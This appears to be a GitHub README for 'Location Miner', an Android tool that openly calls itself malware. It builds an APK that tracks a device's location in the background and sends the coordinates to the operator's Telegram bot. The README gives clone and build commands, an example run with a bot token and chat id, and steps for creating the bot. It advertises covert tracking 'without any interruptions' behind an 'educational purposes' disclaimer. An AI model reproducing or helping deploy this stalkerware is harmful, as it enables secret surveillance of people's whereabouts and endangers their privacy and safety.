<div align="center">
    <img src="/images/icon.png" width="30%" />
    <h1><strong>Location Miner (Under Development)</strong></h1>
    <h3>Yet another powerful Android malware designed to track device location and send coordinates to telegram bot.</h3>
    <h4>This software is exclusively designed for educational purposes ⚠️</h4>
</div>


## Features

- <strong>Real-time Location Tracking:</strong> LocationEye allows you to monitor a device's location in real-time, keeping you informed about its whereabouts.
- <strong>Easy setup:</strong> Simplified and user-friendly setup, making it a breeze to start using LocationEye
- <strong>Anonymous and secure:</strong> LocationEye tracks location in the background without any interruptions
- <strong>Telegram based:</strong> LocationEye sends all collected data to your own Telegram bot, eliminating the need for port forwarding or complex server setups. You can trust your data is easily accessible and secure

## Setup and installation

### Step 1

```
git https://github.com/mkdirlove/LocationMiner.git
```
```
cd LocationMiner
```
```
bash locationminer.sh
```

### Usage

```
 _                 _   _          __  __ _              
| |   ___  __ __ _| |_(_)___ _ _ |  \/  (_)_ _  ___ _ _ 
| |__/ _ \/ _/ _` |  _| / _ \ ' \| |\/| | | ' \/ -_) '_|
|____\___/\__\__,_|\__|_\___/_||_|_|  |_|_|_||_\___|_|  
                                                        
  Made with <3 by @mkdirlove             v1.0-dev

Using tools:
  APKTool: apktool
  Jarsigner: jarsigner

Usage: locationminer.sh --tg_id <id_content> --tg_bot_token <bot_token> --sign <sign_option>
```

### Example Usage

```
bash locationminer.sh --tg_id 1234578 --tg_bot_token DFGD34dfgtry34 --sign yes
```

### Step 2
Obtain your Telegram bot token and your numeric Telegram id.

<strong>Create a Telegram bot:</strong>

Open BotFather on your telegram acccount: [Open BotFather](https://t.me/BotFather)

Start BotFather and send <strong>/newbot</strong> commend and then BotFather will ask you to enter a name and a username for your bot.

After that BotFather will create your bot, copy and save your bot token and click on your bot username and start it.

<p float="left">
  <img src="/images/prv1.png" width="20%" />
  <img src="/images/prv2.png" width="20%" />
</p>

<strong>Obtain your numeric id:</strong>

To obtain your teleram account numeric id you need to start @userinfobot Teleram bot

[Click here to start userinfobot Telegram bot](https://t.me/userinfobot)

After starting this bot, the bot will send you your numeric telegram id

<p float="left">
  <img src="/images/prv3.png" width="20%" />
</p>


